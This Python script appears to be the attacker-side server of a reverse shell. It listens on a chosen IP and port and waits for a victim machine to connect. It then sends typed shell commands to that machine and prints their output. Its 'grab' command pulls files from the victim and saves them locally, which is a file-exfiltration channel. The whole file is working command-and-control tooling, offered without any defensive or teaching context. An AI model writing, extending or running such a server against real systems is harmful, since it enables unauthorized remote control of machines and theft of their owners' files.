import socket
import sys

if len(sys.argv) < 2:
    print('[-] Usage: shell-server.py [IP] [PORT]')
    sys.exit(-1)

ip = sys.argv[1]
port = int(sys.argv[2])


def transfer(conn, command):

    conn.send(command)
    f = open('topic.grab', 'wb')
    while True:
        bits = conn.recv(1024)
        if b'Unable to find the file' in bits:
            print(f'[-] Unable to find the file')
            break
        if bits.endswith(b'DONE'):
            print('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)

    print(f'[+] Listening for incoming TCP connection on port {port}')

    conn, addr = s.accept()

    print(f'[+] We got a connection from: ', addr)

    while True:

        command = bytes(input("Shell> "), encoding='utf-8')
        if b'terminate' in command:
            conn.send(b'terminate')
            conn.close()
            break
        elif b'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command)
            print(conn.recv(1024).decode(encoding='utf-8'))


def main():
    connect()

if __name__ == '__main__':
    main()
